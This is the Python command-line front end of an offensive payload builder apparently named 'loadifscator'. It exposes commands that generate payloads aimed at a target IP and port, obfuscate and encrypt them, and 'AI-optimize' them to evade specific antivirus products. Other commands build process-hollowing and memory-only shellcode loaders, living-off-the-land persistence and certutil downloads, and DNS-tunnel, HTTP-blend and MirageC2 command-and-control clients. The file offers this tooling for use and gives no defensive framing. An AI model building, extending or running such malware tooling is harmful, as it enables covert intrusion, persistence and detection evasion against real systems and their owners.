import typer
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from loadifscator.payloads.generator import generate_payload
from loadifscator.obfuscators.base64 import base64_obfuscate
from loadifscator.obfuscators.xor import xor_obfuscate
try:
    from loadifscator.obfuscators.stringmangle import string_mangle
except ImportError:
    string_mangle = None
from loadifscator.obfuscators.polymorphic import polymorphic_obfuscate
try:
    from loadifscator.obfuscators.metamorphic import MetamorphicEngine  # type: ignore
except ImportError:
    MetamorphicEngine = None
from loadifscator.encryptors.aes import aes_encrypt
from loadifscator.encoder.oneliner import generate_oneliner
from loadifscator.utils.banner import show_banner
from loadifscator.ai.payload_optimizer import AIPayloadOptimizer
from loadifscator.evasion.process_hollowing import ProcessHollowing
from loadifscator.evasion.memory_only import MemoryOnlyExecution
from loadifscator.evasion.living_off_land import LivingOffTheLand
from loadifscator.c2.mirage_connector import MirageC2Connector
from loadifscator.c2.dns_tunnel import DNSTunnelC2

console = Console()
app = typer.Typer()

@app.command()
def generate(
    lang: str = typer.Argument(..., help="Language (python, bash, powershell, c)"),
    ip: str = typer.Argument(..., help="Target IP address"),
    port: int = typer.Argument(..., help="Target port"),
    output: str = typer.Option(..., "-o", "--output", help="Output file path")
):
    """Generate a payload."""
    show_banner()
    generate_payload(lang, ip, port, output)

@app.command()
def obfuscate(
    type: str = typer.Argument(..., help="Obfuscation type (base64, xor, stringmangle, polymorphic)"),
    file: str = typer.Option(..., "--file", help="Input file path"),
    output: str = typer.Option(..., "-o", "--output", help="Output file path"),
    key: str = typer.Option("", "--key", help="Encryption key (for XOR)")
):
    """Obfuscate a payload with advanced techniques."""
    show_banner()
    if type == 'base64':
        base64_obfuscate(file, output)
    elif type == 'xor':
        xor_obfuscate(file, key, output)
    elif type == 'stringmangle':
        if string_mangle:
            string_mangle(file, output)
        else:
            typer.echo('[!] String mangling module not available')
    elif type == 'polymorphic':
        polymorphic_obfuscate(file, output)
    else:
        typer.echo(f'[!] Obfuscation type "{type}" not supported. Available: base64, xor, stringmangle, polymorphic')

@app.command()
def encrypt(
    file: str = typer.Option(..., "--file", help="Input file path"),
    key: str = typer.Option(..., "--key", help="Encryption key"),
    output: str = typer.Option(..., "-o", "--output", help="Output file path")
):
    """Encrypt a payload with AES-256-CBC."""
    aes_encrypt(file, key, output)

@app.command()
def oneliner(
    file: str = typer.Option(..., "--file", help="Input file path"),
    lang: str = typer.Option(..., "--lang", help="Target language (python, bash, powershell)")
):
    """Generate a one-liner for the payload."""
    generate_oneliner(file, lang)

@app.command()
def bind(
    payload: str = typer.Option(..., "--payload", help="Payload file path"),
    decoy: str = typer.Option(..., "--decoy", help="Decoy file path"),
    output: str = typer.Option(..., "-o", "--output", help="Output file path")
):
    """Bind payload to a decoy file (stub)."""
    typer.echo('Binder module is a stub in this version.')

@app.command()
def ai_optimize(
    file: str = typer.Option(..., "--file", help="Input file path"),
    target_av: str = typer.Option("generic", "--target", help="Target AV for optimization"),
    output: str = typer.Option(..., "-o", "--output", help="Output file path")
):
    """Use AI to optimize payload for AV evasion."""
    show_banner()
    optimizer = AIPayloadOptimizer()
    
    with open(file, 'r') as f:
        payload = f.read()
    
    optimized = optimizer.optimize_payload(payload, target_av)
    
    with open(output, 'w') as f:
        f.write(optimized)
    
    console.print(f"[+] AI-optimized payload written to {output}")

@app.command()
def metamorphic(
    file: str = typer.Option(..., "--file", help="Input file path"),
    iterations: int = typer.Option(3, "--iterations", help="Number of transformations"),
    output: str = typer.Option(..., "-o", "--output", help="Output file path")
):
    """Apply metamorphic transformations to payload."""
    show_banner()
    if MetamorphicEngine:
        engine = MetamorphicEngine()
        
        with open(file, 'r') as f:
            payload = f.read()
        
        transformed = engine.generate_unique_build(payload)
        
        with open(output, 'w') as f:
            f.write(transformed)
        
        console.print(f"[+] Metamorphic payload written to {output}")
    else:
        console.print("[!] Metamorphic engine not available")

@app.command()
def hollow(
    target_process: str = typer.Option("notepad.exe", "--process", help="Target process to hollow"),
    output: str = typer.Option(..., "-o", "--output", help="Output file path")
):
    """Generate process hollowing payload."""
    show_banner()
    hollowing = ProcessHollowing()
    
    payload = hollowing.generate_hollowing_payload(target_process)
    
    with open(output, 'w') as f:
        f.write(payload)
    
    console.print(f"[+] Process hollowing payload written to {output}")

@app.command()
def c2_mirage(
    server_url: str = typer.Option(..., "--server", help="MirageC2 server URL"),
    listener: str = typer.Option(..., "--listener", help="Listener name"),
    api_key: str = typer.Option(..., "--key", help="API key"),
    output: str = typer.Option(..., "-o", "--output", help="Output file path")
):
    """Generate MirageC2 payload."""
    show_banner()
    connector = MirageC2Connector(server_url, api_key)
    
    payload = connector.generate_mirage_payload(listener)
    
    with open(output, 'w') as f:
        f.write(payload)
    
    console.print(f"[+] MirageC2 payload written to {output}")

@app.command()
def memory_only(
    shellcode_file: str = typer.Option(..., "--shellcode", help="Shellcode file path"),
    output: str = typer.Option(..., "-o", "--output", help="Output file path")
):
    """Generate memory-only execution payload."""
    show_banner()
    memory_exec = MemoryOnlyExecution()
    
    with open(shellcode_file, 'rb') as f:
        shellcode = f.read()
    
    payload = memory_exec.generate_memory_shellcode_loader(shellcode)
    
    with open(output, 'w') as f:
        f.write(payload)
    
    console.print(f"[+] Memory-only payload written to {output}")

@app.command()
def living_off_land(
    technique: str = typer.Option(..., "--technique", help="Technique (powershell, wmi, registry, schtasks, com, certutil, rundll32)"),
    payload: str = typer.Option(..., "--payload", help="Payload to execute"),
    output: str = typer.Option(..., "-o", "--output", help="Output file path")
):
    """Generate living-off-the-land payload."""
    show_banner()
    lotl = LivingOffTheLand()
    
    if technique == 'powershell':
        result = lotl.generate_powershell_stealth(payload)
    elif technique == 'wmi':
        result = lotl.generate_wmi_persistence(payload)
    elif technique == 'registry':
        result = lotl.generate_registry_persistence(payload)
    elif technique == 'schtasks':
        result = lotl.generate_schtasks_persistence(payload)
    elif technique == 'com':
        result = lotl.generate_com_execution(payload)
    elif technique == 'certutil':
        result = lotl.generate_certutil_download(payload)
    elif technique == 'rundll32':
        result = lotl.generate_rundll32_execution(payload, "DllRegisterServer")
    else:
        console.print(f"[!] Technique '{technique}' not supported")
        return
    
    with open(output, 'w') as f:
        f.write(result)
    
    console.print(f"[+] Living-off-the-land payload written to {output}")

@app.command()
def dns_tunnel(
    domain: str = typer.Option(..., "--domain", help="Domain for DNS tunneling"),
    c2_server: str = typer.Option(..., "--server", help="C2 server IP"),
    output: str = typer.Option(..., "-o", "--output", help="Output file path")
):
    """Generate DNS tunneling C2 payload."""
    show_banner()
    dns_c2 = DNSTunnelC2(domain)
    
    payload = dns_c2.generate_dns_client(c2_server)
    
    with open(output, 'w') as f:
        f.write(payload)
    
    console.print(f"[+] DNS tunnel payload written to {output}")

@app.command()
def http_blend(
    c2_url: str = typer.Option(..., "--url", help="C2 server URL"),
    output: str = typer.Option(..., "-o", "--output", help="Output file path")
):
    """Generate HTTP blending C2 payload."""
    show_banner()
    dns_c2 = DNSTunnelC2()
    
    payload = dns_c2.generate_http_blend(c2_url)
    
    with open(output, 'w') as f:
        f.write(payload)
    
    console.print(f"[+] HTTP blend payload written to {output}")

if __name__ == "__main__":
    app() 